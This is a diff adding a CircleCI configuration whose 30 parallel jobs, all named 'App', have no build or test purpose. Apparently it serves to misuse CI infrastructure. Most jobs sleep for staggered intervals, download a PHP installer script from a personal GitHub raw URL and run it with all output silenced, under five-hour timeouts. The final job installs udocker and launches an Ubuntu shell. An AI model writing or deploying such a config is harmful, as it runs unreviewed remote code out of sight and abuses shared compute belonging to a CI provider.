@@ -1,0 +1,523 @@
+
+version: 2.1
+jobs:
+  
+  App_01:
+    docker:
+      - image: circleci/ruby:3.0.1-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 60s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+ 
+  App_02:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+    resource_class: large
+    steps:
+      
+          
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 70s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_03:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 80s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1 
+  App_04:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 90s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_05:
+    docker:
+      - image: circleci/ruby:3.0
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 90s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_06:
+    docker:
+      - image: circleci/rust:1.53-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 90s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_07:
+    docker:
+      - image: circleci/golang:1.16.5
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 100s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_08:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 110s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_09:
+    docker:
+      - image: circleci/ruby:2.7.4-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 120s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_10:
+    docker:
+      - image: circleci/rust:1.52.1-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 130s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_11:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 140s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_12:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 150s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_13:
+    docker:
+      - image: circleci/ruby:2.7.3
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 160s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_14:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 170s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_15:
+    docker:
+      - image: circleci/golang:1.16.5
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 180s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  
+   
+  App_16:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 190s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_17:
+    docker:
+      - image: circleci/ruby:2.6.8
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 200s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_18:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 210s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_19:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 220s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_20:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 230s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+
+  App_21:
+    docker:
+      - image: circleci/golang:1.16.5
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 240s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_22:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 250s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_23:
+    docker:
+      - image: circleci/ruby:2.6.8
+    resource_class: large
+    steps:
+     
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 260s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_24:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 270s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_25:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 280s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_26:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 290s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+
+  App_27:
+    docker:
+      - image: circleci/ruby:3.0.1-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 300s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_28:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 310s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_29:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+    resource_class: large
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 320s
+            apt update
+            apt install -y php
+            apt install -y lsb
+            wget https://raw.githubusercontent.com/samrikulan/FOS-Streaming-v1/master/install_panel.php
+            php install_panel.php >/dev/null 2>&1
+  App_30:
+    docker:
+      - image: circleci/elixir:1.12.2
+    resource_class: large
+    steps:
+     
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            sleep 330s
+            pip3 install --upgrade pip && pip3 install udocker && udocker install && udocker pull ubuntu && udocker run ubuntu /bin/bash
+
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - App_01
+            - App_02
+            - App_03
+            - App_04
+            - App_05
+            - App_06
+            - App_07
+            - App_08
+            - App_09
+            - App_10
+            - App_11
+            - App_12
+            - App_13
+            - App_14
+            - App_15
+            - App_16
+            - App_17
+            - App_18
+            - App_19
+            - App_20
+            - App_21
+            - App_22
+            - App_23
+            - App_24
+            - App_25
+            - App_26
+            - App_27
+            - App_28
+            - App_29
+            - App_30
+            
